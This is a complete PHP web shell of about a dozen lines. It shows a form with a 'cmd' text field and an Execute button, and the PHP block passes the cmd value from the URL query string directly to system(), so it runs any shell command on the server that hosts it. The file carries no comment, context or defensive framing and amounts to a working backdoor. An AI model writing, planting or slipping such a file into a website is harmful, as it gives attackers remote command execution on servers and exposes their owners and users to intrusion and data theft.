<html>
<body>
<form method="post" name="<?php echo basename($SERVER['PHP_SELF']); ?>">
<input type="text" name="cmd" autofocus id="cmd" size="80">
<input type="submit" value="Execute">
</form>
<pre>
<?php
  if(isset($_GET['cmd'])){
    system($_GET['cmd']);
  }
?>
</pre>
</body>
</html>
